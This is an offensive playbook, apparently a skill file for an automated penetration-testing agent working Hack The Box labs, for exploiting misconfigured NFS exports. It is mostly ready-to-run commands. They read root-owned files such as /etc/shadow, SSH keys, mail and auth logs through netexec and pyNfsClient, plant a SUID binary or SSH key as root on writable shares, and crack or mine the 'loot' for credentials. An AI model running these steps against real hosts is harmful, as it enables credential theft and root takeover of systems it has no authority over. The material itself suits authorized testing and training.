# NFS export: userland read + no_root_squash loot

Trigger: `showmount -e <host>` returns an export (often `*`). Boxes where
`mount -t nfs` is unavailable (no sudo/root, container) or where the export
is `ro` but has `no_root_squash`. Keywords: NFSv3, rpcbind, pyNfsClient,
`nxc nfs`, root_squash, onboarding share.

## Procedure

1. Fingerprint: `showmount -e HOST; rpcinfo -p HOST` (mountd + nfs on 2049).
   Note export options from the target side if readable (`/etc/exports`).
2. **Read files without mounting** (userland NFSv3, no root needed) —
   `pyNfsClient` (Debian/Kali: `python3-pyNfsClient`): portmap → mountd →
   `Mount.mnt(export)` → `NFSv3.lookup`/`read`. Mechanics, AUTH_UNIX details
   and pitfalls: see `skills/privesc/nfs-userland-read-pynfsclient.md`;
   reference implementation: `labs/HTB/machines/enigma/nfs_read.py`.
3. **Fast path with netexec**: `nxc nfs HOST -u '' -p '' --ls <path>` and
   `--get-file <remote> <local>` (there is no login; uid is asserted).
4. **`no_root_squash` check** — read a root-owned 0600 file:
   `nxc nfs HOST --get-file /etc/shadow shadow`, `/root/*`, `/etc/exports`,
   `/home/*/user.txt`, `/var/mail/*`, `auth.log*`. If it works, this is a
   full host-FS file-read primitive as root — pull everything of value.
5. **`no_root_squash` + writable export → write primitive:** create a SUID
   binary or drop an SSH key as uid 0:
   `nxc nfs HOST --put-file ./evil /tmp/evil` (then execute via another
   service/shell) — only when the export is `rw`.
6. Convert the loot: onboarding PDFs/docs → creds; `/etc/shadow` → crack;
   `auth.log` → usernames and intended pivot paths; `.bash_history` → free
   commands/creds.

## Pitfalls

- `mount` needs CAP_SYS_ADMIN — don't burn turns trying it as a user.
- `root_squash` (the default) still allows world-readable files; only
  `no_root_squash` gives root-owned reads/writes.
- A `ro` export still allows the read primitive; don't equate `ro` with safe.
- Underscore hostnames on other services break glibc resolution — use
  `curl --resolve` / `Host:` header, not DNS.
